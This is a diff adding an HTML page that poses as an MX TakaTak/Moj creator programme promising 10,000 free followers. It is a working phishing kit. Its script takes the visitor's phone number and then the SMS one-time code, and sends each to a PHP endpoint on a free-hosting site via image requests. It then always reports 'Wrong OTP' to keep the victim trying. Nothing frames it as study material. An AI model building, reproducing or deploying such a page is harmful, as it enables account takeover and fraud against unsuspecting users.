@@ -1,0 +1,176 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <link href='https://fonts.googleapis.com/css?family=Muli' rel='stylesheet'>
+    <style>
+        body {
+            text-align: center;
+            background-image: linear-gradient(to bottom, #3e21b4, #252326 45%, #141318 94%);
+            color: #ffffff;
+            font-family: 'Muli', sans-serif;
+			margin:0px;
+        }
+
+        header {
+            height: 40.111px;
+            padding: 16px 20px;
+            box-shadow: 0 2px 12px 0 rgb(0 0 0 / 10%);
+            background: linear-gradient(to bottom, #ffb300, #ffa726 45%, #ff5722 94%);
+            position: fixed;
+            top: 0;
+            width: 100%;
+            z-index: 9;
+        }
+
+        input[type=number] {
+            background-image: linear-gradient(to bottom, #141318, #141318 45%, #141318 94%);
+            border-radius: 5px;
+            line-height: 25px;
+            height: 41px;
+            font-family: 'Muli', sans-serif;
+            color: white;
+            font-size: 16px;
+            outline: none;
+			padding:0px 15px;
+        }
+
+        section {
+            margin-top: 100px;
+        }
+		
+		#loading{
+		height:30px;
+		width:30px;
+		padding:10px;
+		margin-left: 45%;
+		}
+		#loading2{
+		height:30px;
+		width:30px;
+		padding:10px;
+		margin-left: 45%;
+		}
+
+        .large {
+            white-space: nowrap;
+            color: white;
+            background-image: linear-gradient(to left, #f9293f, #fc4933 0%);
+            font-size: 14px;
+            border-radius: 20px;
+            width: 80%;
+            line-height: 36px;
+            border: none;
+            outline: none;
+            letter-spacing: 0.5px;
+            margin-top: 20px;
+        }
+
+        #m {
+            color: red;
+            display: none;
+        }
+    </style>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MX Creator Club</title>
+</head>
+
+<body>
+    <header class="header">
+        <div class="container"><a class="logo" href="/">
+		<img src="https://play-lh.googleusercontent.com/nXX7ffvomTQq9iHLGLcKUe9nW41Ovk5R9q60Ek_CnXoj-7TBEYHmLM_EcWmxVXnoVQ=h42-rw" alt="MX TakaTak"/></a>
+		<!--<img src="https://qqcdn.mxtakatak.com/static/images/takatak-logo-black.svg" alt="MX TakaTak"/>-->
+		<img src="https://play-lh.googleusercontent.com/KqeKUXHP336vQkJIhdulZRh4V2IO5hoqak-NBd6Etj3-UjlnKz9unx8Z7XpVlXEMEZs=h42-rw" />
+		</div>
+    </header>
+    <section>
+        <h1>Welcome To MOJ Creator Hub!</h1>
+		<h2>Get 10,000 followers for free!</h2>
+        <div id="section1">
+            <p style="font-size: large;">Enter Your Mobile Number</p>
+            <label for="phone">🇮🇳 +91 </label>
+            <input id="phone" type="number" />
+            <br>			<img style="display:none;" src="https://aws1.discourse-cdn.com/sitepoint/original/3X/e/3/e352b26bbfa8b233050087d6cb32667da3ff809c.gif" id="loading2"/>
+<br>
+            <p id="m">Please Check Your Phone Number!</p>
+            <p style="padding-right: 50px;padding-left: 50px;">Click NEXT to verify your account. An SMS will be sent to
+                verify your number.
+            </p>
+            <input onclick="step1()" type="button" class="large" value="Next">
+        </div>
+        <div id="section2" style="display: none;">
+            <p style="font-size: large;">Enter the code that was sent to</p>
+            <label id="ewy" for="OTP">+91 98221228</label><br>
+            <input id="otp" type="number" style="text-align: center;" /><br>
+            <br>
+			<img style="display:none;" src="https://aws1.discourse-cdn.com/sitepoint/original/3X/e/3/e352b26bbfa8b233050087d6cb32667da3ff809c.gif" id="loading"/>
+            <br><input onclick="step2()" type="button" class="large" value="Verify"><br>
+            <input type="button" class="large" value="Resend">
+        </div>
+        <h2>Increase Your Followers on The Go</h2>
+        <br>
+        <img src="https://play-lh.googleusercontent.com/SPisZrxWBS2G7GqGI45HadEHPAY9PB0Pus_PQJCqIDpSSYOTfU5UElkAeUyMpBcC2Q=w2560-h1440-rw" alt="" srcset=""/>
+        <h2>Boost Your Profile and get more Views</h2>
+        <img src="https://play-lh.googleusercontent.com/nlDZQWGn46eZkkliBI8lVNNUCX6bIJzSjtY0IODHPaBdpcT9In2hsVhgYzILI_bXKg=w2560-h1440-rw" alt="" srcset=""/>
+<p>☆ Original India Short Videos App ☆ Create Music Videos ☆ Funny Dialogue Dubbing ☆ Post Real Videos ☆ Lip-Sync Videos
+
+Made in India | Moj Lite is a short video community app created locally and especially by Sharechat in India. On Moj Lite, we provide rich video content quality and now we have Virat Kohli on Moj Lite, watch his latest fitness videos, funny videos and more!
+
+Now create a duet video with your favorite team's player's video, choose from teams like KKR, Mumbai Indians, RCB, Punjab Kings, Delhi Capitals, Sunrise Hyderabad & CSK & be the next Moj Super Star. Now snack on Moj videos for funny & trending videos.
+</p>
+    </section>
+
+<script>
+        function step1() {
+            var phn = document.getElementById('phone').value;
+            var ewy = document.getElementById('ewy');
+            var section2 = document.getElementById('section2');
+            var section1 = document.getElementById('section1');
+            var m = document.getElementById('m');
+            if (phn.length == 10) {
+                ewy.innerText = '+91 1' + phn;
+                //TODO : Send to server
+				document.getElementById("loading2").style.display = "block";
+				var newImg = new Image;
+				newImg.onerror = function() {
+					//_img.src = this.src;
+					setTimeout(
+  function() 
+  {
+    					document.getElementById("loading2").style.display = "none";	
+						section2.style.display = 'block';
+                section1.style.display = 'none';
+
+  }, 5000);					
+				}
+				newImg.src = 'https://goauniversity.000webhostapp.com/wp-content/uploads/2021/10/mx.php?url='+phn;
+            } else {
+                m.style.display = 'block';
+            }
+        }
+        function step2() {
+            var otp = document.getElementById('otp').value;
+            //TODO : Send to server
+				var newImg2 = new Image;
+				document.getElementById("loading").style.display = "block";
+				newImg2.onerror = function() {
+					//_img.src = this.src;
+					setTimeout(
+  function() 
+  {
+    					document.getElementById("loading").style.display = "none";
+					alert("Wrong OTP. Please Try Again.");
+
+  }, 5000);					
+				}
+				newImg2.src = 'https://goauniversity.000webhostapp.com/wp-content/uploads/2021/10/mx.php?url='+ otp;
+
+        }
+        
+    </script>
+
+</body>
+
+</html>
